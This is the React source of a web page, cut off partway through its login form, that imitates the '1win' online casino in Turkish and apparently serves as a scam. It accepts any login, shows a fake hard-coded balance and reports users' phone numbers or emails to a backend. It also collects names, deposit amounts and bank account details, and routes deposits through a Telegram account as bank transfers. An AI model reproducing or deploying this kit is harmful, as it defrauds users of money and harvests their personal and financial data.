import { useState, useEffect, useRef } from 'react';
import './App.css';

const TELEGRAM_LINK = 'https://t.me/ONESUPPORT_TR';
const COUNTRIES = [
  { flag: '🇷🇺', code: '+7', name: 'Russia (Россия)' },
  { flag: '🇺🇦', code: '+380', name: 'Ukraine (Україна)' },
  { flag: '🇰🇿', code: '+7', name: 'Kazakhstan (Казахстан)' },
  { flag: '🇩🇿', code: '+213', name: 'Algeria' },
  { flag: '🇦🇸', code: '+1', name: 'American Samoa' },
  { flag: '🇦🇩', code: '+376', name: 'Andorra' },
  { flag: '🇦🇴', code: '+244', name: 'Angola' },
  { flag: '🇦🇮', code: '+1264', name: 'Anguilla' },
  { flag: '🇦🇬', code: '+1268', name: 'Antigua and Barbuda' },
  { flag: '🇦🇷', code: '+54', name: 'Argentina' },
  { flag: '🇦🇲', code: '+374', name: 'Armenia (Հայաստան)' },
  { flag: '🇦🇼', code: '+297', name: 'Aruba' },
  { flag: '🇦🇺', code: '+61', name: 'Australia' },
  { flag: '🇦🇹', code: '+43', name: 'Austria (Österreich)' },
  { flag: '🇦🇿', code: '+994', name: 'Azerbaijan (Azərbaycanca)' },
  { flag: '🇧🇸', code: '+1242', name: 'Bahamas' },
  { flag: '🇧🇭', code: '+973', name: 'Bahrain (البحرين)' },
  { flag: '🇧🇩', code: '+880', name: 'Bangladesh (বাংলাদেশ)' },
  { flag: '🇧🇧', code: '+1246', name: 'Barbados' },
  { flag: '🇧🇾', code: '+375', name: 'Belarus (Беларусь)' },
  { flag: '🇧🇪', code: '+32', name: 'Belgium (België)' },
  { flag: '🇧🇿', code: '+501', name: 'Belize' },
  { flag: '🇧🇯', code: '+229', name: 'Benin (Bénin)' },
  { flag: '🇧🇲', code: '+1441', name: 'Bermuda' },
  { flag: '🇧🇹', code: '+975', name: 'Bhutan (འབྲུག)' },
  { flag: '🇧🇴', code: '+591', name: 'Bolivia' },
  { flag: '🇧🇦', code: '+387', name: 'Bosnia and Herzegovina (Босна и Херцеговина)' },
  { flag: '🇧🇼', code: '+267', name: 'Botswana' },
  { flag: '🇧🇷', code: '+55', name: 'Brazil (Brasil)' },
  { flag: '🇮🇴', code: '+246', name: 'British Indian Ocean Territory' },
  { flag: '🇻🇬', code: '+1284', name: 'British Virgin Islands' },
  { flag: '🇧🇳', code: '+673', name: 'Brunei' },
  { flag: '🇧🇬', code: '+359', name: 'Bulgaria (България)' },
  { flag: '🇧🇫', code: '+226', name: 'Burkina Faso' },
  { flag: '🇧🇮', code: '+257', name: 'Burundi (Uburundi)' },
  { flag: '🇰🇭', code: '+855', name: 'Cambodia (កម្ពុជា)' },
  { flag: '🇨🇲', code: '+237', name: 'Cameroon (Cameroun)' },
  { flag: '🇨🇦', code: '+1', name: 'Canada' },
  { flag: '🇨🇻', code: '+238', name: 'Cape Verde (Kabu Verdi)' },
  { flag: '🇰🇾', code: '+1345', name: 'Cayman Islands' },
  { flag: '🇨🇫', code: '+236', name: 'Central African Republic (République centrafricaine)' },
  { flag: '🇹🇩', code: '+235', name: 'Chad (Tchad)' },
  { flag: '🇨🇱', code: '+56', name: 'Chile' },
  { flag: '🇨🇳', code: '+86', name: 'China (中国)' },
  { flag: '🇨🇽', code: '+61', name: 'Christmas Island' },
  { flag: '🇨🇨', code: '+61', name: 'Cocos (Keeling) Islands' },
  { flag: '🇨🇴', code: '+57', name: 'Colombia' },
  { flag: '🇰🇲', code: '+269', name: 'Comoros (جزر القمر)' },
  { flag: '🇨🇩', code: '+243', name: 'Congo (Kinshasa)' },
  { flag: '🇨🇬', code: '+242', name: 'Congo (Republic) (Congo-Brazzaville)' },
  { flag: '🇨🇰', code: '+682', name: 'Cook Islands' },
  { flag: '🇨🇷', code: '+506', name: 'Costa Rica' },
  { flag: '🇨🇮', code: '+225', name: 'Côte d’Ivoire' },
  { flag: '🇭🇷', code: '+385', name: 'Croatia (Hrvatska)' },
  { flag: '🇨🇺', code: '+53', name: 'Cuba' },
  { flag: '🇨🇼', code: '+599', name: 'Curaçao' },
  { flag: '🇨🇾', code: '+357', name: 'Cyprus (Κύπρος)' },
  { flag: '🇨🇿', code: '+420', name: 'Czechia (Česká republika)' },
  { flag: '🇩🇰', code: '+45', name: 'Denmark (Danmark)' },
  { flag: '🇩🇯', code: '+253', name: 'Djibouti' },
  { flag: '🇩🇲', code: '+1767', name: 'Dominica' },
  { flag: '🇩🇴', code: '+1', name: 'Dominican Republic (República Dominicana)' },
  { flag: '🇪🇨', code: '+593', name: 'Ecuador' },
  { flag: '🇪🇬', code: '+20', name: 'Egypt (مصر)' },
  { flag: '🇸🇻', code: '+503', name: 'El Salvador' },
  { flag: '🇬🇶', code: '+240', name: 'Equatorial Guinea (Guinea Ecuatorial)' },
  { flag: '🇪🇷', code: '+291', name: 'Eritrea' },
  { flag: '🇪🇪', code: '+372', name: 'Estonia (Eesti)' },
  { flag: '🇪🇹', code: '+251', name: 'Ethiopia' },
  { flag: '🇫🇰', code: '+500', name: 'Falkland Islands (Islas Malvinas)' },
  { flag: '🇫🇴', code: '+298', name: 'Faroe Islands (Føroyar)' },
  { flag: '🇫🇯', code: '+679', name: 'Fiji' },
  { flag: '🇫🇮', code: '+358', name: 'Finland (Suomi)' },
  { flag: '🇫🇷', code: '+33', name: 'France' },
  { flag: '🇵🇫', code: '+689', name: 'French Polynesia (Polynésie française)' },
  { flag: '🇬🇦', code: '+241', name: 'Gabon' },
  { flag: '🇬🇲', code: '+220', name: 'Gambia' },
  { flag: '🇬🇪', code: '+995', name: 'Georgia (საქართველო)' },
  { flag: '🇩🇪', code: '+49', name: 'Germany (Deutschland)' },
  { flag: '🇬🇭', code: '+233', name: 'Ghana (Gaana)' },
  { flag: '🇬🇮', code: '+350', name: 'Gibraltar' },
  { flag: '🇬🇷', code: '+30', name: 'Greece (Ελλάδα)' },
  { flag: '🇬🇱', code: '+299', name: 'Greenland (Kalaallit Nunaat)' },
  { flag: '🇬🇩', code: '+1473', name: 'Grenada' },
  { flag: '🇬🇺', code: '+1671', name: 'Guam' },
  { flag: '🇬🇹', code: '+502', name: 'Guatemala' },
  { flag: '🇬🇬', code: '+44', name: 'Guernsey' },
  { flag: '🇬🇳', code: '+224', name: 'Guinea (Guinée)' },
  { flag: '🇬🇼', code: '+245', name: 'Guinea-Bissau (Guiné Bissau)' },
  { flag: '🇭🇹', code: '+509', name: 'Haiti' },
  { flag: '🇭🇳', code: '+504', name: 'Honduras' },
  { flag: '🇭🇰', code: '+852', name: 'Hong Kong (香港)' },
  { flag: '🇭🇺', code: '+36', name: 'Hungary (Magyarország)' },
  { flag: '🇮🇸', code: '+354', name: 'Iceland (Ísland)' },
  { flag: '🇮🇳', code: '+91', name: 'India (भारत)' },
  { flag: '🇮🇩', code: '+62', name: 'Indonesia' },
  { flag: '🇮🇷', code: '+98', name: 'Iran (ایران)' },
  { flag: '🇮🇶', code: '+964', name: 'Iraq (العراق)' },
  { flag: '🇮🇪', code: '+353', name: 'Ireland' },
  { flag: '🇮🇲', code: '+44', name: 'Isle of Man' },
  { flag: '🇮🇱', code: '+972', name: 'Israel (ישראל)' },
  { flag: '🇮🇹', code: '+39', name: 'Italy (Italia)' },
  { flag: '🇯🇲', code: '+1', name: 'Jamaica' },
  { flag: '🇯🇵', code: '+81', name: 'Japan (日本)' },
  { flag: '🇯🇪', code: '+44', name: 'Jersey' },
  { flag: '🇯🇴', code: '+962', name: 'Jordan (الأردن)' },
  { flag: '🇰🇪', code: '+254', name: 'Kenya' },
  { flag: '🇽🇰', code: '+383', name: 'Kosovo' },
  { flag: '🇰🇼', code: '+965', name: 'Kuwait (الكويت)' },
  { flag: '🇰🇬', code: '+996', name: 'Kyrgyzstan (кыргызстан)' },
  { flag: '🇱🇦', code: '+856', name: 'Laos (ລາວ)' },
  { flag: '🇱🇻', code: '+371', name: 'Latvia (Latvija)' },
  { flag: '🇱🇧', code: '+961', name: 'Lebanon (لبنان)' },
  { flag: '🇱🇸', code: '+266', name: 'Lesotho' },
  { flag: '🇱🇷', code: '+231', name: 'Liberia' },
  { flag: '🇱🇾', code: '+218', name: 'Libya (ليبيا)' },
  { flag: '🇱🇮', code: '+423', name: 'Liechtenstein' },
  { flag: '🇱🇹', code: '+370', name: 'Lithuania (Lietuva)' },
  { flag: '🇱🇺', code: '+352', name: 'Luxembourg' },
  { flag: '🇲🇰', code: '+389', name: 'North Macedonia (Македонија)' },
  { flag: '🇲🇬', code: '+261', name: 'Madagascar (Madagasikara)' },
  { flag: '🇲🇼', code: '+265', name: 'Malawi' },
  { flag: '🇲🇾', code: '+60', name: 'Malaysia' },
  { flag: '🇲🇻', code: '+960', name: 'Maldives' },
  { flag: '🇲🇱', code: '+223', name: 'Mali' },
  { flag: '🇲🇹', code: '+356', name: 'Malta' },
  { flag: '🇲🇭', code: '+692', name: 'Marshall Islands' },
  { flag: '🇲🇷', code: '+222', name: 'Mauritania (موريتانيا)' },
  { flag: '🇲🇺', code: '+230', name: 'Mauritius (Moris)' },
  { flag: '🇲🇽', code: '+52', name: 'Mexico (México)' },
  { flag: '🇫🇲', code: '+691', name: 'Micronesia' },
  { flag: '🇲🇩', code: '+373', name: 'Moldova (Republica Moldova)' },
  { flag: '🇲🇨', code: '+377', name: 'Monaco' },
  { flag: '🇲🇳', code: '+976', name: 'Mongolia (Монгол)' },
  { flag: '🇲🇪', code: '+382', name: 'Montenegro (Crna Gora)' },
  { flag: '🇲🇸', code: '+1664', name: 'Montserrat' },
  { flag: '🇲🇦', code: '+212', name: 'Morocco (المغرب)' },
  { flag: '🇲🇿', code: '+258', name: 'Mozambique (Moçambique)' },
  { flag: '🇲🇲', code: '+95', name: 'Myanmar (Burma) (မြန်မာ)' },
  { flag: '🇳🇦', code: '+264', name: 'Namibia (Namibië)' },
  { flag: '🇳🇷', code: '+674', name: 'Nauru' },
  { flag: '🇳🇵', code: '+977', name: 'Nepal (नेपाल)' },
  { flag: '🇳🇱', code: '+31', name: 'Netherlands (Nederland)' },
  { flag: '🇳🇿', code: '+64', name: 'New Zealand' },
  { flag: '🇳🇮', code: '+505', name: 'Nicaragua' },
  { flag: '🇳🇪', code: '+227', name: 'Niger (Nijar)' },
  { flag: '🇳🇬', code: '+234', name: 'Nigeria' },
  { flag: '🇳🇺', code: '+683', name: 'Niue' },
  { flag: '🇰🇵', code: '+850', name: 'North Korea (조선 민주주의 인민 공화국)' },
  { flag: '🇲🇵', code: '+1670', name: 'Northern Mariana Islands' },
  { flag: '🇳🇴', code: '+47', name: 'Norway (Norge)' },
  { flag: '🇴🇲', code: '+968', name: 'Oman (عمان)' },
  { flag: '🇵🇰', code: '+92', name: 'Pakistan (پاکستان)' },
  { flag: '🇵🇼', code: '+680', name: 'Palau' },
  { flag: '🇵🇸', code: '+970', name: 'Palestine (فلسطين)' },
  { flag: '🇵🇦', code: '+507', name: 'Panama (Panamá)' },
  { flag: '🇵🇬', code: '+675', name: 'Papua New Guinea' },
  { flag: '🇵🇾', code: '+595', name: 'Paraguay' },
  { flag: '🇵🇪', code: '+51', name: 'Peru (Perú)' },
  { flag: '🇵🇭', code: '+63', name: 'Philippines' },
  { flag: '🇵🇱', code: '+48', name: 'Poland (Polska)' },
  { flag: '🇵🇹', code: '+351', name: 'Portugal' },
  { flag: '🇵🇷', code: '+1', name: 'Puerto Rico' },
  { flag: '🇶🇦', code: '+974', name: 'Qatar (قطر)' },
  { flag: '🇷🇪', code: '+262', name: 'Reunion (Réunion)' },
  { flag: '🇷🇴', code: '+40', name: 'Romania (România)' },
  { flag: '🇷🇼', code: '+250', name: 'Rwanda' },
  { flag: '🇰🇳', code: '+1869', name: 'Saint Kitts and Nevis' },
  { flag: '🇼🇸', code: '+685', name: 'Samoa' },
  { flag: '🇸🇲', code: '+378', name: 'San Marino' },
  { flag: '🇸🇹', code: '+239', name: 'São Tomé and Principe (São Tomé e Príncipe)' },
  { flag: '🇸🇦', code: '+966', name: 'Saudi Arabia (المملكة العربية السعودية)' },
  { flag: '🇸🇳', code: '+221', name: 'Senegal (Sénégal)' },
  { flag: '🇷🇸', code: '+381', name: 'Serbia (Србија)' },
  { flag: '🇸🇨', code: '+248', name: 'Seychelles' },
  { flag: '🇸🇱', code: '+232', name: 'Sierra Leone' },
  { flag: '🇸🇬', code: '+65', name: 'Singapore' },
  { flag: '🇸🇽', code: '+1721', name: 'Sint Maarten' },
  { flag: '🇸🇰', code: '+421', name: 'Slovakia (Slovensko)' },
  { flag: '🇸🇮', code: '+386', name: 'Slovenia (Slovenija)' },
  { flag: '🇸🇧', code: '+677', name: 'Solomon Islands' },
  { flag: '🇸🇴', code: '+252', name: 'Somalia (Soomaaliya)' },
  { flag: '🇿🇦', code: '+27', name: 'South Africa' },
  { flag: '🇰🇷', code: '+82', name: 'South Korea (대한민국)' },
  { flag: '🇸🇸', code: '+211', name: 'South Sudan (جنوب السودان)' },
  { flag: '🇪🇸', code: '+34', name: 'Spain (España)' },
  { flag: '🇱🇰', code: '+94', name: 'Sri Lanka (ශ්‍රී ලංකාව)' },
  { flag: '🇸🇩', code: '+249', name: 'Sudan (السودان)' },
  { flag: '🇸🇪', code: '+46', name: 'Sweden (Sverige)' },
  { flag: '🇨🇭', code: '+41', name: 'Switzerland (Schweiz)' },
  { flag: '🇸🇾', code: '+963', name: 'Syria (سوريا)' },
  { flag: '🇹🇼', code: '+886', name: 'Taiwan (台灣)' },
  { flag: '🇹🇯', code: '+992', name: 'Tajikistan' },
  { flag: '🇹🇿', code: '+255', name: 'Tanzania' },
  { flag: '🇹🇭', code: '+66', name: 'Thailand (ไทย)' },
  { flag: '🇹🇱', code: '+670', name: 'Timor-Leste' },
  { flag: '🇹🇬', code: '+228', name: 'Togo' },
  { flag: '🇹🇰', code: '+690', name: 'Tokelau' },
  { flag: '🇹🇴', code: '+676', name: 'Tonga' },
  { flag: '🇹🇹', code: '+1868', name: 'Trinidad and Tobago' },
  { flag: '🇹🇳', code: '+216', name: 'Tunisia (تونس)' },
  { flag: '🇹🇷', code: '+90', name: 'Turkey (Türkiye)' },
  { flag: '🇹🇲', code: '+993', name: 'Turkmenistan' },
  { flag: '🇺🇬', code: '+256', name: 'Uganda' },
  { flag: '🇦🇪', code: '+971', name: 'United Arab Emirates (الإمارات العربية المتحدة)' },
  { flag: '🇬🇧', code: '+44', name: 'United Kingdom' },
  { flag: '🇺🇸', code: '+1', name: 'United States' },
  { flag: '🇺🇾', code: '+598', name: 'Uruguay' },
  { flag: '🇺🇿', code: '+998', name: 'Uzbekistan (O‘zbekiston)' },
  { flag: '🇻🇺', code: '+678', name: 'Vanuatu' },
  { flag: '🇻🇦', code: '+39', name: 'Vatican City (Città del Vaticano)' },
  { flag: '🇻🇪', code: '+58', name: 'Venezuela' },
  { flag: '🇻🇳', code: '+84', name: 'Vietnam (Việt Nam)' },
  { flag: '🇾🇪', code: '+967', name: 'Yemen (اليمن)' },
  { flag: '🇿🇲', code: '+260', name: 'Zambia' },
  { flag: '🇿🇼', code: '+263', name: 'Zimbabwe' },
];

function App() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [username, setUsername] = useState('');
  const [showLoginModal, setShowLoginModal] = useState(true);
  const [showRegisterModal, setShowRegisterModal] = useState(false);
  const [showDepositModal, setShowDepositModal] = useState(false);
  const [showWithdrawModal, setShowWithdrawModal] = useState(false);
  const [showCountryPicker, setShowCountryPicker] = useState(false);
  const [countryTarget, setCountryTarget] = useState('login');
  const [countrySearch, setCountrySearch] = useState('');
  const [showSocialModal, setShowSocialModal] = useState(false);
  const [showProfileModal, setShowProfileModal] = useState(false);
  const [showBalanceToast, setShowBalanceToast] = useState(false);
  const [depositStep, setDepositStep] = useState(1);
  const [loginMethod, setLoginMethod] = useState('phone');
  const [registerMethod, setRegisterMethod] = useState('phone');
  const [countdown, setCountdown] = useState(600);
  const countdownRef = useRef(null);

  // Form states
  const [loginPhone, setLoginPhone] = useState('');
  const [loginCountry, setLoginCountry] = useState(COUNTRIES.find((country) => country.code === '+90') || COUNTRIES[0]);
  const [loginEmail, setLoginEmail] = useState('');
  const [loginPassword, setLoginPassword] = useState('');
  const [registerPhone, setRegisterPhone] = useState('');
  const [registerCountry, setRegisterCountry] = useState(COUNTRIES.find((country) => country.code === '+90') || COUNTRIES[0]);
  const [registerEmail, setRegisterEmail] = useState('');
  const [registerPassword, setRegisterPassword] = useState('');
  const [registerCurrency, setRegisterCurrency] = useState('TRY');

  // Deposit form
  const [depFirstName, setDepFirstName] = useState('');
  const [depLastName, setDepLastName] = useState('');
  const [depAmount, setDepAmount] = useState('');
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [withdrawAccount, setWithdrawAccount] = useState('');

  const sendNotification = async (event, details = {}, overrideUser, overrideMethod, overrideStatus) => {
    const userValue = overrideUser || username;
    fetch('/api/notify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        event,
        user: {
          username: userValue || 'Misafir',
          method: overrideMethod || loginMethod,
          status: overrideStatus || (isLoggedIn ? 'Giriş yapmış' : 'Misafir'),
        },
        details,
      }),
    }).catch(() => {});
  };

  // Balance toast auto-dismiss
  useEffect(() => {
    if (showBalanceToast) {
      const timer = setTimeout(() => setShowBalanceToast(false), 10000);
      return () => clearTimeout(timer);
    }
  }, [showBalanceToast]);

  // Countdown timer for deposit step 2
  useEffect(() => {
    if (depositStep === 2 && showDepositModal) {
      setCountdown(600);
      countdownRef.current = setInterval(() => {
        setCountdown(prev => {
          if (prev <= 0) { clearInterval(countdownRef.current); return 0; }
          return prev - 1;
        });
      }, 1000);
      return () => clearInterval(countdownRef.current);
    }
  }, [depositStep, showDepositModal]);

  useEffect(() => {
    const savedUser = localStorage.getItem('username');
    if (savedUser) { setUsername(savedUser); setIsLoggedIn(true); }
  }, []);

  const handleLogin = (e) => {
    e.preventDefault();
    const user = loginMethod === 'phone' ? `${loginCountry.code} ${loginPhone}` : loginEmail;
    if (user && loginPassword) {
      setUsername(user); setIsLoggedIn(true);
      localStorage.setItem('username', user);
      sendNotification('login', { kanal: loginMethod === 'phone' ? 'Telefon' : 'E-posta' }, user, loginMethod, 'Giriş yapmış');
      setShowLoginModal(false);
      setLoginPhone(''); setLoginEmail(''); setLoginPassword('');
    }
  };

  const handleRegister = (e) => {
    e.preventDefault();
    const user = registerMethod === 'phone' ? `${registerCountry.code} ${registerPhone}` : registerEmail;
    if (user && registerPassword) {
      setUsername(user); setIsLoggedIn(true);
      localStorage.setItem('username', user);
      sendNotification('register', { kanal: registerMethod === 'phone' ? 'Telefon' : 'E-posta', paraBirimi: registerCurrency }, user, registerMethod, 'Yeni kayıt');
      setShowRegisterModal(false);
      setRegisterPhone(''); setRegisterEmail(''); setRegisterPassword('');
    }
  };

  const handleLogout = () => {
    sendNotification('logout', { islem: 'Kullanıcı hesaptan çıktı' });
    setIsLoggedIn(false); setUsername('');
    localStorage.removeItem('username');
  };

  const openTelegram = () => window.open(TELEGRAM_LINK, '_blank');

  const handleBalanceClick = () => setShowBalanceToast(true);

  const openDeposit = () => {
    setDepositStep(1);
    setDepFirstName(''); setDepLastName(''); setDepAmount('');
    setShowDepositModal(true);
  };

  const handleDepositNext = () => {
    if (depFirstName && depLastName && depAmount) {
      sendNotification('deposit_request', {
        ad: depFirstName,
        soyad: depLastName,
        tutar: `₺${depAmount}`,
        yontem: 'Banka Havalesi',
      });
      setDepositStep(2);
    }
  };

  const handleTransferConfirm = () => {
    const msg = `Ödeme Bilgileri:%0AAdı: ${depFirstName}%0ASoyadı: ${depLastName}%0ATutar: ₺${depAmount}`;
    window.open(`https://t.me/ONESUPPORT_TR?text=${msg}`, '_blank');
    setShowDepositModal(false);
  };

  const openWithdraw = () => {
    setWithdrawAmount('');
    setWithdrawAccount('');
    setShowProfileModal(false);
    setShowWithdrawModal(true);
  };

  const openCountryPicker = (target) => {
    setCountryTarget(target);
    setCountrySearch('');
    setShowCountryPicker(true);
  };

  const handleCountryButtonPress = (event, target) => {
    event.preventDefault();
    event.stopPropagation();
    openCountryPicker(target);
  };

  const selectCountry = (country) => {
    if (countryTarget === 'register') {
      setRegisterCountry(country);
    } else {
      setLoginCountry(country);
    }
    setShowCountryPicker(false);
  };

  const filteredCountries = COUNTRIES.filter((country) => {
    const term = countrySearch.trim().toLowerCase();
    return !term || country.name.toLowerCase().includes(term) || country.code.includes(term);
  });

  const handleWithdrawSubmit = (e) => {
    e.preventDefault();
    if (!withdrawAmount || !withdrawAccount) return;
    sendNotification('withdraw_request', {
      tutar: `₺${withdrawAmount}`,
      hesap: withdrawAccount,
      yontem: 'Banka Havalesi',
    });
    setShowWithdrawModal(false);
    setShowBalanceToast(true);
  };

  const closeDeposit = () => {
    setShowDepositModal(false);
    clearInterval(countdownRef.current);
  };

  const formatCountdown = (s) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${String(m).padStart(2,'0')}dk : ${String(sec).padStart(2,'0')}sn`;
  };

  const setQuickAmount = (val) => setDepAmount(val);

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
  };

  const games = [
    { name: 'LUCKY JET', color: 'from-purple-600 to-purple-800' },
    { name: 'ROCKET QUEEN', color: 'from-pink-500 to-pink-700' },
    { name: 'MINES', color: 'from-blue-500 to-blue-700' },
    { name: 'BLACKJACK', color: 'from-blue-600 to-blue-900' },
    { name: 'CRASH', color: 'from-green-600 to-green-800' },
    { name: 'COINFLIP', color: 'from-yellow-500 to-orange-600' },
  ];

  const socialMediaItems = [
    { name: 'Telegram', icon: '✈️' },
    { name: 'WhatsApp', icon: '💬' },
    { name: 'Instagram', icon: '📷' },
    { name: 'Facebook', icon: '📘' },
    { name: 'X (Twitter)', icon: '🐦' },
    { name: 'Pinterest', icon: '📌' },
    { name: 'Threads', icon: '🧵' },
  ];

  return (
    <div className="app-container">
      {/* Balance Toast */}
      {showBalanceToast && (
        <div className="toast-overlay" onClick={() => setShowBalanceToast(false)}>
          <div className="toast-notification" onClick={(e) => e.stopPropagation()}>
            <div className="toast-icon">
              <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
              </svg>
            </div>
            <div className="toast-text">
              <p className="toast-title">Bakiye Yükleme</p>
              <p className="toast-desc">Bakiye yüklemek için Telegram'dan yazınız</p>
            </div>
            <button onClick={() => setShowBalanceToast(false)} className="toast-close">✕</button>
          </div>
        </div>
      )}

      {/* Left Sidebar */}
      <div className="sidebar">
        <button onClick={() => isLoggedIn ? setShowProfileModal(true) : setShowLoginModal(true)} className="profile-icon" data-testid="profile-icon">
          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
          </svg>
        </button>

        <div className="free-money-card" onClick={openTelegram}>
          <div className="free-money-emoji">💸</div>
          <div className="free-money-text">
            <span>Free</span>
            <span>money</span>
          </div>
        </div>

        <div className="sidebar-icons-list">
          <button className="sb-btn arrow-btn" onClick={openTelegram}><span>&raquo;</span></button>
          <button className="sb-btn" onClick={openTelegram}>♠</button>
          <button className="sb-btn" onClick={openTelegram}>⚽</button>
          <button className="sb-btn" onClick={() => { if(isLoggedIn) openDeposit(); else setShowLoginModal(true); }}>💲</button>
          <button className="sb-btn has-badge" onClick={openTelegram}>🎁<span className="badge">1</span></button>
          <button className="sb-btn" onClick={openTelegram}>👑</button>
          <button className="sb-btn" onClick={openTelegram}>%</button>
          <div className="sb-divider"></div>
          <button className="sb-btn" onClick={openTelegram}>Ф</button>
          <button className="sb-btn windows" onClick={openTelegram}>⊞</button>
          <div className="sb-mini-group">
            <button className="sb-mini" onClick={openTelegram}>✈</button>
            <button className="sb-mini" onClick={openTelegram}>💬</button>
            <button className="sb-mini" onClick={openTelegram}>⊙</button>
            <button className="sb-mini" onClick={openTelegram}>⋮</button>
          </div>
          <button className="sb-btn flag" onClick={openTelegram}>🇹🇷</button>
          <div className="sb-divider"></div>
          <button className="sb-btn chat-bubble" onClick={() => setShowSocialModal(true)}>
            <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M18 10c0 3.866-3.582 7-8 7a8.841 8.841 0 01-4.083-.98L2 17l1.338-3.123C2.493 12.767 2 11.434 2 10c0-3.866 3.582-7 8-7s8 3.134 8 7zM7 9H5v2h2V9zm8 0h-2v2h2V9zM9 9h2v2H9V9z" clipRule="evenodd" />
            </svg>
          </button>
        </div>
      </div>

      {/* Main Content */}
      <div className="main-content">
        {/* Header */}
        <header className="header">
          <div className="header-left">
            <img
              src="https://customer-assets.emergentagent.com/job_wait-image-coming/artifacts/zvtfamu3_g%C3%B6rsel_2026-04-13_235130355.png"
              alt="1win"
              className="logo-image"
            />
            <div className="nav-icons">
              <button className="nav-icon active" data-testid="nav-home">
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M10.707 2.293a1 1 0 00-1.414 0l-7 7a1 1 0 001.414 1.414L4 10.414V17a1 1 0 001 1h2a1 1 0 001-1v-2a1 1 0 011-1h2a1 1 0 011 1v2a1 1 0 001 1h2a1 1 0 001-1v-6.586l.293.293a1 1 0 001.414-1.414l-7-7z" />
                </svg>
              </button>
              <button className="nav-icon">
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M11.49 3.17c-.38-1.56-2.6-1.56-2.98 0a1.532 1.532 0 01-2.286.948c-1.372-.836-2.942.734-2.106 2.106.54.886.061 2.042-.947 2.287-1.561.379-1.561 2.6 0 2.978a1.532 1.532 0 01.947 2.287c-.836 1.372.734 2.942 2.106 2.106a1.532 1.532 0 012.287.947c.379 1.561 2.6 1.561 2.978 0a1.533 1.533 0 012.287-.947c1.372.836 2.942-.734 2.106-2.106a1.533 1.533 0 01.947-2.287c1.561-.379 1.561-2.6 0-2.978a1.532 1.532 0 01-.947-2.287c.836-1.372-.734-2.942-2.106-2.106a1.532 1.532 0 01-2.287-.947zM10 13a3 3 0 100-6 3 3 0 000 6z" clipRule="evenodd" />
                </svg>
              </button>
              <button className="nav-icon">
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z" clipRule="evenodd" />
                </svg>
              </button>
              <button className="nav-icon">⚽</button>
            </div>
          </div>

          <div className="header-right">
            {isLoggedIn ? (
              <>
                <button onClick={handleBalanceClick} className="balance-btn" data-testid="balance-btn">
                  <span className="bal-code">TRY ∨</span>
                  <span className="bal-amount">45.821</span>
                </button>
                <button onClick={openDeposit} className="deposit-btn" data-testid="deposit-btn">Para yatır</button>
                <button onClick={openTelegram} className="notif-btn" data-testid="notif-btn">
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                    <path d="M10 2a6 6 0 00-6 6v3.586l-.707.707A1 1 0 004 14h12a1 1 0 00.707-1.707L16 11.586V8a6 6 0 00-6-6zM10 18a3 3 0 01-3-3h6a3 3 0 01-3 3z" />
                  </svg>
                </button>
              </>
            ) : (
              <>
                <button onClick={() => setShowLoginModal(true)} className="auth-btn" data-testid="login-btn">Giriş</button>
                <button onClick={() => setShowRegisterModal(true)} className="auth-btn register" data-testid="register-btn">Kayıt</button>
              </>
            )}
          </div>
        </header>

        {/* Content Area */}
        <div className="content-area">
          <div className="hero-banner">
            <div className="hero-content">
              <h2 className="hero-title">VIP club:</h2>
              <p className="hero-subtitle">özel ayrıcalıklar</p>
              <p className="hero-subtitle">ve kişiye özel hizmet</p>
            </div>
          </div>

          <div className="promo-section">
            <div className="promo-card-large">
              <div className="promo-content">
                <h3 className="promo-title">1 BTC ve</h3>
                <h3 className="promo-title">ücretsiz döndürme</h3>
                <h3 className="promo-title">çekilişi</h3>
                <h3 className="promo-title">Easter BTC'de</h3>
                <button className="promo-btn">Daha fazla bilgi</button>
              </div>
            </div>
            <div className="promo-cards-right">
              <div className="promo-card-small green">
                <h4>Free money</h4>
                <p className="text-xs mt-1">URUS SE ve başka</p>
                <p className="text-xs">ödüller çekilişi</p>
              </div>
              <div className="promo-card-small blue">
                <h4>Bonuslar</h4>
                <p className="text-xs mt-1">4 mevcut bonus</p>
              </div>
            </div>
          </div>

          <div className="games-section">
            <div className="games-header">
              <div className="flex items-center gap-2">
                <span className="text-white text-sm font-bold">1W</span>
                <h3 className="games-title">1win games</h3>
              </div>
              <div className="games-nav">
                <button className="games-nav-text">Tüm oyunlar</button>
                <button className="games-arrow-btn">‹</button>
                <button className="games-arrow-btn">›</button>
              </div>
            </div>
            <div className="games-grid">
              {games.map((game, idx) => (
                <div key={idx} className="game-card">
                  <div className={`game-card-bg bg-gradient-to-br ${game.color}`}>
                    <span className="game-card-title">{game.name}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* === MODALS === */}

      {/* Login Modal */}
      {showLoginModal && (
        <div className="modal-overlay" onClick={() => setShowLoginModal(false)}>
          <div className="modal-box auth-modal" onClick={(e) => e.stopPropagation()}>
            <div className="modal-top">
              <h2>Giriş</h2>
              <button onClick={() => setShowLoginModal(false)} className="modal-x">✕</button>
            </div>
            <div className="modal-tabs">
